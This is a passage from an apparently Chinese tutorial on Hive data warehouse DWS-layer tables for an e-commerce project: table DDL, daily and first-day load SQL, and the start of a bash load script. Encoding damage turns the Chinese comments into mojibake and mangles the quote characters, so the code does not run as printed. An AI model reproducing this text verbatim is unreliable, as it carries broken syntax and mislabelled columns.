join</p><p>(</p><p>select</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name</p><p>from dim_sku_full</p><p>where dt=â€™2020-06-15â€™</p><p>)sku</p><p>on od.sku_id=sku.id;</p><h4 id="äº¤æ˜“åŸŸç”¨æˆ·å•†å“ç²’åº¦é€€å•æœ€è¿‘1æ—¥æ±‡æ€»è¡¨"><a href="#äº¤æ˜“åŸŸç”¨æˆ·å•†å“ç²’åº¦é€€å•æœ€è¿‘1æ—¥æ±‡æ€»è¡¨" class="headerlink" title="äº¤æ˜“åŸŸç”¨æˆ·å•†å“ç²’åº¦é€€å•æœ€è¿‘1æ—¥æ±‡æ€»è¡¨"></a>äº¤æ˜“åŸŸç”¨æˆ·å•†å“ç²’åº¦é€€å•æœ€è¿‘1æ—¥æ±‡æ€»è¡¨</h4><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_sku_order_refund_1d;</p><p>CREATE EXTERNAL TABLE dws_trade_user_sku_order_refund_1d</p><p>(</p><p>`user_id` STRING COMMENT â€˜ç”¨æˆ·idâ€™,</p><p>`sku_id` STRING COMMENT â€˜sku_idâ€™,</p><p>`sku_name` STRING COMMENT â€˜skuåç§°â€™,</p><p>`category1_id` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»idâ€™,</p><p>`category1_name` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»åç§°â€™,</p><p>`category2_id` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»idâ€™,</p><p>`category2_name` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»åç§°â€™,</p><p>`category3_id` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»idâ€™,</p><p>`category3_name` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»åç§°â€™,</p><p>`tm_id` STRING COMMENT â€˜å“ç‰Œidâ€™,</p><p>`tm_name` STRING COMMENT â€˜å“ç‰Œåç§°â€™,</p><p>`order_refund_count_1d` BIGINT COMMENT â€˜æœ€è¿‘1æ—¥é€€å•æ¬¡æ•°â€™,</p><p>`order_refund_num_1d` BIGINT COMMENT â€˜æœ€è¿‘1æ—¥é€€å•ä»¶æ•°â€™,</p><p>`order_refund_amount_1d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘1æ—¥é€€å•é‡‘é¢â€™</p><p>) COMMENT â€˜äº¤æ˜“åŸŸç”¨æˆ·å•†å“ç²’åº¦é€€å•æœ€è¿‘1æ—¥æ±‡æ€»äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dws/dws_trade_user_sku_order_refund_1dâ€™</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p><strong>ï¼ˆ1ï¼‰é¦–æ—¥è£…è½½</strong></p><p>set hive.exec.dynamic.partition.mode=nonstrict;</p><p>insert overwrite table dws_trade_user_sku_order_refund_1d partition(dt)</p><p>select</p><p>user_id,</p><p>sku_id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name,</p><p>order_refund_count,</p><p>order_refund_num,</p><p>order_refund_amount,</p><p>dt</p><p>from</p><p>(</p><p>select</p><p>dt,</p><p>user_id,</p><p>sku_id,</p><p>count(*) order_refund_count,</p><p>sum(refund_num) order_refund_num,</p><p>sum(refund_amount) order_refund_amount</p><p>from dwd_trade_order_refund_inc</p><p>group by dt,user_id,sku_id</p><p>)od</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name</p><p>from dim_sku_full</p><p>where dt=â€™2020-06-14â€™</p><p>)sku</p><p>on od.sku_id=sku.id;</p><p><strong>ï¼ˆ2ï¼‰æ¯æ—¥è£…è½½</strong></p><p>insert overwrite table dws_trade_user_sku_order_refund_1d<br>partition(dt=â€™2020-06-15â€™)</p><p>select</p><p>user_id,</p><p>sku_id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name,</p><p>order_refund_count,</p><p>order_refund_num,</p><p>order_refund_amount</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>sku_id,</p><p>count(*) order_refund_count,</p><p>sum(refund_num) order_refund_num,</p><p>sum(refund_amount) order_refund_amount</p><p>from dwd_trade_order_refund_inc</p><p>where dt=â€™2020-06-15â€™</p><p>group by user_id,sku_id</p><p>)od</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name</p><p>from dim_sku_full</p><p>where dt=â€™2020-06-15â€™</p><p>)sku</p><p>on od.sku_id=sku.id;</p><h4 id="äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦è®¢å•æœ€è¿‘1æ—¥æ±‡æ€»è¡¨"><a href="#äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦è®¢å•æœ€è¿‘1æ—¥æ±‡æ€»è¡¨" class="headerlink" title="äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦è®¢å•æœ€è¿‘1æ—¥æ±‡æ€»è¡¨"></a>äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦è®¢å•æœ€è¿‘1æ—¥æ±‡æ€»è¡¨</h4><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_order_1d;</p><p>CREATE EXTERNAL TABLE dws_trade_user_order_1d</p><p>(</p><p>`user_id` STRING COMMENT â€˜ç”¨æˆ·idâ€™,</p><p>`order_count_1d` BIGINT COMMENT â€˜æœ€è¿‘1æ—¥ä¸‹å•æ¬¡æ•°â€™,</p><p>`order_num_1d` BIGINT COMMENT â€˜æœ€è¿‘1æ—¥ä¸‹å•å•†å“ä»¶æ•°â€™,</p><p>`order_original_amount_1d` DECIMAL(16, 2) COMMENT<br>â€˜æœ€è¿‘1æ—¥æœ€è¿‘1æ—¥ä¸‹å•åŸå§‹é‡‘é¢â€™,</p><p>`activity_reduce_amount_1d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘1æ—¥ä¸‹å•æ´»åŠ¨ä¼˜æƒ é‡‘é¢â€™,</p><p>`coupon_reduce_amount_1d` DECIMAL(16, 2) COMMENT â€˜ä¸‹å•ä¼˜æƒ åˆ¸ä¼˜æƒ é‡‘é¢â€™,</p><p>`order_total_amount_1d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘1æ—¥ä¸‹å•æœ€ç»ˆé‡‘é¢â€™</p><p>) COMMENT â€˜äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦è®¢å•æœ€è¿‘1æ—¥æ±‡æ€»äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dws/dws_trade_user_order_1dâ€™</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p><strong>ï¼ˆ1ï¼‰é¦–æ—¥è£…è½½</strong></p><p>insert overwrite table dws_trade_user_order_1d partition(dt)</p><p>select</p><p>user_id,</p><p>count(distinct(order_id)),</p><p>sum(sku_num),</p><p>sum(split_original_amount),</p><p>sum(nvl(split_activity_amount,0)),</p><p>sum(nvl(split_coupon_amount,0)),</p><p>sum(split_total_amount),</p><p>dt</p><p>from dwd_trade_order_detail_inc</p><p>group by user_id,dt;</p><p><strong>ï¼ˆ2ï¼‰æ¯æ—¥è£…è½½</strong></p><p>insert overwrite table dws_trade_user_order_1d partition(dt=â€™2020-06-15â€™)</p><p>select</p><p>user_id,</p><p>count(distinct(order_id)),</p><p>sum(sku_num),</p><p>sum(split_original_amount),</p><p>sum(nvl(split_activity_amount,0)),</p><p>sum(nvl(split_coupon_amount,0)),</p><p>sum(split_total_amount)</p><p>from dwd_trade_order_detail_inc</p><p>where dt=â€™2020-06-15â€™</p><p>group by user_id;</p><h4 id="äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦åŠ è´­æœ€è¿‘1æ—¥æ±‡æ€»è¡¨"><a href="#äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦åŠ è´­æœ€è¿‘1æ—¥æ±‡æ€»è¡¨" class="headerlink" title="äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦åŠ è´­æœ€è¿‘1æ—¥æ±‡æ€»è¡¨"></a>äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦åŠ è´­æœ€è¿‘1æ—¥æ±‡æ€»è¡¨</h4><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_cart_add_1d;</p><p>CREATE EXTERNAL TABLE dws_trade_user_cart_add_1d</p><p>(</p><p>`user_id` STRING COMMENT â€˜ç”¨æˆ·idâ€™,</p><p>`cart_add_count_1d` BIGINT COMMENT â€˜æœ€è¿‘1æ—¥åŠ è´­æ¬¡æ•°â€™,</p><p>`cart_add_num_1d` BIGINT COMMENT â€˜æœ€è¿‘1æ—¥åŠ è´­å•†å“ä»¶æ•°â€™</p><p>) COMMENT â€˜äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦åŠ è´­æœ€è¿‘1æ—¥æ±‡æ€»äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dws/dws_trade_user_cart_add_1dâ€™</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p><strong>ï¼ˆ1ï¼‰é¦–æ—¥è£…è½½</strong></p><p>insert overwrite table dws_trade_user_cart_add_1d partition(dt)</p><p>select</p><p>user_id,</p><p>count(*),</p><p>sum(sku_num),</p><p>dt</p><p>from dwd_trade_cart_add_inc</p><p>group by user_id,dt;</p><p><strong>ï¼ˆ2ï¼‰æ¯æ—¥è£…è½½</strong></p><p>insert overwrite table dws_trade_user_cart_add_1d partition(dt=â€™2020-06-15â€™)</p><p>select</p><p>user_id,</p><p>count(*),</p><p>sum(sku_num)</p><p>from dwd_trade_cart_add_inc</p><p>where dt=â€™2020-06-15â€™</p><p>group by user_id;</p><h4 id="äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦æ”¯ä»˜æœ€è¿‘1æ—¥æ±‡æ€»è¡¨"><a href="#äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦æ”¯ä»˜æœ€è¿‘1æ—¥æ±‡æ€»è¡¨" class="headerlink" title="äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦æ”¯ä»˜æœ€è¿‘1æ—¥æ±‡æ€»è¡¨"></a>äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦æ”¯ä»˜æœ€è¿‘1æ—¥æ±‡æ€»è¡¨</h4><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_payment_1d;</p><p>CREATE EXTERNAL TABLE dws_trade_user_payment_1d</p><p>(</p><p>`user_id` STRING COMMENT â€˜ç”¨æˆ·idâ€™,</p><p>`payment_count_1d` BIGINT COMMENT â€˜æœ€è¿‘1æ—¥æ”¯ä»˜æ¬¡æ•°â€™,</p><p>`payment_num_1d` BIGINT COMMENT â€˜æœ€è¿‘1æ—¥æ”¯ä»˜å•†å“ä»¶æ•°â€™,</p><p>`payment_amount_1d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘1æ—¥æ”¯ä»˜é‡‘é¢â€™</p><p>) COMMENT â€˜äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦æ”¯ä»˜æœ€è¿‘1æ—¥æ±‡æ€»äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dws/dws_trade_user_payment_1dâ€™</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p><strong>ï¼ˆ1ï¼‰é¦–æ—¥è£…è½½</strong></p><p>insert overwrite table dws_trade_user_payment_1d partition(dt)</p><p>select</p><p>user_id,</p><p>count(distinct(order_id)),</p><p>sum(sku_num),</p><p>sum(split_payment_amount),</p><p>dt</p><p>from dwd_trade_pay_detail_suc_inc</p><p>group by user_id,dt;</p><p><strong>ï¼ˆ2ï¼‰æ¯æ—¥è£…è½½</strong></p><p>insert overwrite table dws_trade_user_payment_1d partition(dt=â€™2020-06-15â€™)</p><p>select</p><p>user_id,</p><p>count(distinct(order_id)),</p><p>sum(sku_num),</p><p>sum(split_payment_amount)</p><p>from dwd_trade_pay_detail_suc_inc</p><p>where dt=â€™2020-06-15â€™</p><p>group by user_id;</p><h4 id="äº¤æ˜“åŸŸçœä»½ç²’åº¦è®¢å•æœ€è¿‘1æ—¥æ±‡æ€»è¡¨"><a href="#äº¤æ˜“åŸŸçœä»½ç²’åº¦è®¢å•æœ€è¿‘1æ—¥æ±‡æ€»è¡¨" class="headerlink" title="äº¤æ˜“åŸŸçœä»½ç²’åº¦è®¢å•æœ€è¿‘1æ—¥æ±‡æ€»è¡¨"></a>äº¤æ˜“åŸŸçœä»½ç²’åº¦è®¢å•æœ€è¿‘1æ—¥æ±‡æ€»è¡¨</h4><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dws_trade_province_order_1d;</p><p>CREATE EXTERNAL TABLE dws_trade_province_order_1d</p><p>(</p><p>`province_id` STRING COMMENT â€˜ç”¨æˆ·idâ€™,</p><p>`province_name` STRING COMMENT â€˜çœä»½åç§°â€™,</p><p>`area_code` STRING COMMENT â€˜åœ°åŒºç¼–ç â€™,</p><p>`iso_code` STRING COMMENT â€˜æ—§ç‰ˆISO-3166-2ç¼–ç â€™,</p><p>`iso_3166_2` STRING COMMENT â€˜æ–°ç‰ˆç‰ˆISO-3166-2ç¼–ç â€™,</p><p>`order_count_1d` BIGINT COMMENT â€˜æœ€è¿‘1æ—¥ä¸‹å•æ¬¡æ•°â€™,</p><p>`order_original_amount_1d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘1æ—¥ä¸‹å•åŸå§‹é‡‘é¢â€™,</p><p>`activity_reduce_amount_1d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘1æ—¥ä¸‹å•æ´»åŠ¨ä¼˜æƒ é‡‘é¢â€™,</p><p>`coupon_reduce_amount_1d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘1æ—¥ä¸‹å•ä¼˜æƒ åˆ¸ä¼˜æƒ é‡‘é¢â€™,</p><p>`order_total_amount_1d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘1æ—¥ä¸‹å•æœ€ç»ˆé‡‘é¢â€™</p><p>) COMMENT â€˜äº¤æ˜“åŸŸçœä»½ç²’åº¦è®¢å•æœ€è¿‘1æ—¥æ±‡æ€»äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dws/dws_trade_province_order_1dâ€™</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p><strong>ï¼ˆ1ï¼‰é¦–æ—¥è£…è½½</strong></p><p>set hive.exec.dynamic.partition.mode=nonstrict;</p><p>insert overwrite table dws_trade_province_order_1d partition(dt)</p><p>select</p><p>province_id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2,</p><p>order_count_1d,</p><p>order_original_amount_1d,</p><p>activity_reduce_amount_1d,</p><p>coupon_reduce_amount_1d,</p><p>order_total_amount_1d,</p><p>dt</p><p>from</p><p>(</p><p>select</p><p>province_id,</p><p>count(distinct(order_id)) order_count_1d,</p><p>sum(split_original_amount) order_original_amount_1d,</p><p>sum(nvl(split_activity_amount,0)) activity_reduce_amount_1d,</p><p>sum(nvl(split_coupon_amount,0)) coupon_reduce_amount_1d,</p><p>sum(split_total_amount) order_total_amount_1d,</p><p>dt</p><p>from dwd_trade_order_detail_inc</p><p>group by province_id,dt</p><p>)o</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2</p><p>from dim_province_full</p><p>where dt=â€™2020-06-14â€™</p><p>)p</p><p>on o.province_id=p.id;</p><p><strong>ï¼ˆ2ï¼‰æ¯æ—¥è£…è½½</strong></p><p>insert overwrite table dws_trade_province_order_1d partition(dt=â€™2020-06-15â€™)</p><p>select</p><p>province_id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2,</p><p>order_count_1d,</p><p>order_original_amount_1d,</p><p>activity_reduce_amount_1d,</p><p>coupon_reduce_amount_1d,</p><p>order_total_amount_1d</p><p>from</p><p>(</p><p>select</p><p>province_id,</p><p>count(distinct(order_id)) order_count_1d,</p><p>sum(split_original_amount) order_original_amount_1d,</p><p>sum(nvl(split_activity_amount,0)) activity_reduce_amount_1d,</p><p>sum(nvl(split_coupon_amount,0)) coupon_reduce_amount_1d,</p><p>sum(split_total_amount) order_total_amount_1d</p><p>from dwd_trade_order_detail_inc</p><p>where dt=â€™2020-06-15â€™</p><p>group by province_id</p><p>)o</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2</p><p>from dim_province_full</p><p>where dt=â€™2020-06-15â€™</p><p>)p</p><p>on o.province_id=p.id;</p><h4 id="äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦é€€å•æœ€è¿‘1æ—¥æ±‡æ€»è¡¨"><a href="#äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦é€€å•æœ€è¿‘1æ—¥æ±‡æ€»è¡¨" class="headerlink" title="äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦é€€å•æœ€è¿‘1æ—¥æ±‡æ€»è¡¨"></a>äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦é€€å•æœ€è¿‘1æ—¥æ±‡æ€»è¡¨</h4><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_order_refund_1d;</p><p>CREATE EXTERNAL TABLE dws_trade_user_order_refund_1d</p><p>(</p><p>`user_id` STRING COMMENT â€˜ç”¨æˆ·idâ€™,</p><p>`order_refund_count_1d` BIGINT COMMENT â€˜æœ€è¿‘1æ—¥é€€å•æ¬¡æ•°â€™,</p><p>`order_refund_num_1d` BIGINT COMMENT â€˜æœ€è¿‘1æ—¥é€€å•å•†å“ä»¶æ•°â€™,</p><p>`order_refund_amount_1d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘1æ—¥é€€å•é‡‘é¢â€™</p><p>) COMMENT â€˜äº¤æ˜“åŸŸç”¨æˆ·ç²’åº¦é€€å•æœ€è¿‘1æ—¥æ±‡æ€»äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dws/dws_trade_user_order_refund_1dâ€™</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p><strong>ï¼ˆ1ï¼‰é¦–æ—¥è£…è½½</strong></p><p>set hive.exec.dynamic.partition.mode=nonstrict;</p><p>insert overwrite table dws_trade_user_order_refund_1d partition(dt)</p><p>select</p><p>user_id,</p><p>count(*) order_refund_count,</p><p>sum(refund_num) order_refund_num,</p><p>sum(refund_amount) order_refund_amount,</p><p>dt</p><p>from dwd_trade_order_refund_inc</p><p>group by user_id,dt;</p><p><strong>ï¼ˆ2ï¼‰æ¯æ—¥è£…è½½</strong></p><p>insert overwrite table dws_trade_user_order_refund_1d partition(dt=â€™2020-06-15â€™)</p><p>select</p><p>user_id,</p><p>count(*),</p><p>sum(refund_num),</p><p>sum(refund_amount)</p><p>from dwd_trade_order_refund_inc</p><p>where dt=â€™2020-06-15â€™</p><p>group by user_id;</p><h4 id="æµé‡åŸŸä¼šè¯ç²’åº¦é¡µé¢æµè§ˆæœ€è¿‘1æ—¥æ±‡æ€»è¡¨"><a href="#æµé‡åŸŸä¼šè¯ç²’åº¦é¡µé¢æµè§ˆæœ€è¿‘1æ—¥æ±‡æ€»è¡¨" class="headerlink" title="æµé‡åŸŸä¼šè¯ç²’åº¦é¡µé¢æµè§ˆæœ€è¿‘1æ—¥æ±‡æ€»è¡¨"></a>æµé‡åŸŸä¼šè¯ç²’åº¦é¡µé¢æµè§ˆæœ€è¿‘1æ—¥æ±‡æ€»è¡¨</h4><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dws_traffic_session_page_view_1d;</p><p>CREATE EXTERNAL TABLE dws_traffic_session_page_view_1d</p><p>(</p><p>`session_id` STRING COMMENT â€˜ä¼šè¯idâ€™,</p><p>`mid_id` string comment â€˜è®¾å¤‡idâ€™,</p><p>`brand` string comment â€˜æ‰‹æœºå“ç‰Œâ€™,</p><p>`model` string comment â€˜æ‰‹æœºå‹å·â€™,</p><p>`operate_system` string comment â€˜æ“ä½œç³»ç»Ÿâ€™,</p><p>`version_code` string comment â€˜appç‰ˆæœ¬å·â€™,</p><p>`channel` string comment â€˜æ¸ é“â€™,</p><p>`during_time_1d` BIGINT COMMENT â€˜æœ€è¿‘1æ—¥è®¿é—®æ—¶é•¿â€™,</p><p>`page_count_1d` BIGINT COMMENT â€˜æœ€è¿‘1æ—¥è®¿é—®é¡µé¢æ•°â€™</p><p>) COMMENT â€˜æµé‡åŸŸä¼šè¯ç²’åº¦é¡µé¢æµè§ˆæœ€è¿‘1æ—¥æ±‡æ€»è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dws/dws_traffic_session_page_view_1dâ€™</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table dws_traffic_session_page_view_1d<br>partition(dt=â€™2020-06-14â€™)</p><p>select</p><p>session_id,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>version_code,</p><p>channel,</p><p>sum(during_time),</p><p>count(*)</p><p>from dwd_traffic_page_view_inc</p><p>where dt=â€™2020-06-14â€™</p><p>group by session_id,mid_id,brand,model,operate_system,version_code,channel;</p><h4 id="æµé‡åŸŸè®¿å®¢é¡µé¢ç²’åº¦é¡µé¢æµè§ˆæœ€è¿‘1æ—¥æ±‡æ€»è¡¨"><a href="#æµé‡åŸŸè®¿å®¢é¡µé¢ç²’åº¦é¡µé¢æµè§ˆæœ€è¿‘1æ—¥æ±‡æ€»è¡¨" class="headerlink" title="æµé‡åŸŸè®¿å®¢é¡µé¢ç²’åº¦é¡µé¢æµè§ˆæœ€è¿‘1æ—¥æ±‡æ€»è¡¨"></a>æµé‡åŸŸè®¿å®¢é¡µé¢ç²’åº¦é¡µé¢æµè§ˆæœ€è¿‘1æ—¥æ±‡æ€»è¡¨</h4><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dws_traffic_page_visitor_page_view_1d;</p><p>CREATE EXTERNAL TABLE dws_traffic_page_visitor_page_view_1d</p><p>(</p><p>`mid_id` STRING COMMENT â€˜è®¿å®¢idâ€™,</p><p>`brand` string comment â€˜æ‰‹æœºå“ç‰Œâ€™,</p><p>`model` string comment â€˜æ‰‹æœºå‹å·â€™,</p><p>`operate_system` string comment â€˜æ“ä½œç³»ç»Ÿâ€™,</p><p>`page_id` STRING COMMENT â€˜é¡µé¢idâ€™,</p><p>`during_time_1d` BIGINT COMMENT â€˜æœ€è¿‘1æ—¥æµè§ˆæ—¶é•¿â€™,</p><p>`view_count_1d` BIGINT COMMENT â€˜æœ€è¿‘1æ—¥è®¿é—®æ¬¡æ•°â€™</p><p>) COMMENT â€˜æµé‡åŸŸè®¿å®¢é¡µé¢ç²’åº¦é¡µé¢æµè§ˆæœ€è¿‘1æ—¥æ±‡æ€»äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dws/dws_traffic_page_visitor_page_view_1dâ€™</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table dws_traffic_page_visitor_page_view_1d<br>partition(dt=â€™2020-06-14â€™)</p><p>select</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>page_id,</p><p>sum(during_time),</p><p>count(*)</p><p>from dwd_traffic_page_view_inc</p><p>where dt=â€™2020-06-14â€™</p><p>group by mid_id,brand,model,operate_system,page_id;</p><h4 id="æ•°æ®è£…è½½è„šæœ¬-3"><a href="#æ•°æ®è£…è½½è„šæœ¬-3" class="headerlink" title="æ•°æ®è£…è½½è„šæœ¬"></a>æ•°æ®è£…è½½è„šæœ¬</h4><p><strong>1ï¼‰é¦–æ—¥æ•°æ®è£…è½½è„šæœ¬</strong></p><p>ï¼ˆ1ï¼‰åœ¨hadoop102çš„/home/atguigu/binç›®å½•ä¸‹åˆ›å»ºdwd_to_dws_1d_init.sh</p><p>[atguigu@hadoop102 bin]$ vim dwd_to_dws_1d_init.sh</p><p>ï¼ˆ2ï¼‰ç¼–å†™å¦‚ä¸‹å†…å®¹</p><p>##!/bin/bash</p><p>APP=gmall</p><p>if [ -n â€œ$2â€ ] ;then</p><p>do_date=$2</p><p>else</p><p>echo â€œè¯·ä¼ å…¥æ—¥æœŸå‚æ•°â€</p><p>exit</p><p>fi</p><p>dws_trade_province_order_1d=â€</p><p>insert overwrite table ${APP}.dws_trade_province_order_1d partition(dt)</p><p>select</p><p>province_id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2,</p><p>order_count_1d,</p><p>order_original_amount_1d,</p><p>activity_reduce_amount_1d,</p><p>coupon_reduce_amount_1d,</p><p>order_total_amount_1d,</p><p>dt</p><p>from</p><p>(</p><p>select</p><p>province_id,</p><p>count(distinct(order_id)) order_count_1d,</p><p>sum(split_original_amount) order_original_amount_1d,</p><p>sum(nvl(split_activity_amount,0)) activity_reduce_amount_1d,</p><p>sum(nvl(split_coupon_amount,0)) coupon_reduce_amount_1d,</p><p>sum(split_total_amount) order_total_amount_1d,</p><p>dt</p><p>from ${APP}.dwd_trade_order_detail_inc</p><p>group by province_id,dt</p><p>)o</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2</p><p>from ${APP}.dim_province_full</p><p>where dt=â€™$do_dateâ€™</p><p>)p</p><p>on o.province_id=p.id;</p><p>â€œ</p><p>dws_trade_user_cart_add_1d=â€</p><p>insert overwrite table ${APP}.dws_trade_user_cart_add_1d partition(dt)</p><p>select</p><p>user_id,</p><p>count(*),</p><p>sum(sku_num),</p><p>dt</p><p>from ${APP}.dwd_trade_cart_add_inc</p><p>group by user_id,dt;</p><p>â€œ</p><p>dws_trade_user_order_1d=â€</p><p>insert overwrite table ${APP}.dws_trade_user_order_1d partition(dt)</p><p>select</p><p>user_id,</p><p>count(distinct(order_id)),</p><p>sum(sku_num),</p><p>sum(split_original_amount),</p><p>sum(nvl(split_activity_amount,0)),</p><p>sum(nvl(split_coupon_amount,0)),</p><p>sum(split_total_amount),</p><p>dt</p><p>from ${APP}.dwd_trade_order_detail_inc</p><p>group by user_id,dt;</p><p>â€œ</p><p>dws_trade_user_order_refund_1d=â€</p><p>insert overwrite table ${APP}.dws_trade_user_order_refund_1d partition(dt)</p><p>select</p><p>user_id,</p><p>count(*) order_refund_count,</p><p>sum(refund_num) order_refund_num,</p><p>sum(refund_amount) order_refund_amount,</p><p>dt</p><p>from ${APP}.dwd_trade_order_refund_inc</p><p>group by user_id,dt;</p><p>â€œ</p><p>dws_trade_user_payment_1d=â€</p><p>insert overwrite table ${APP}.dws_trade_user_payment_1d partition(dt)</p><p>select</p><p>user_id,</p><p>count(distinct(order_id)),</p><p>sum(sku_num),</p><p>sum(split_payment_amount),</p><p>dt</p><p>from ${APP}.dwd_trade_pay_detail_suc_inc</p><p>group by user_id,dt;</p><p>â€œ</p><p>dws_trade_user_sku_order_1d=â€</p><p>insert overwrite table ${APP}.dws_trade_user_sku_order_1d 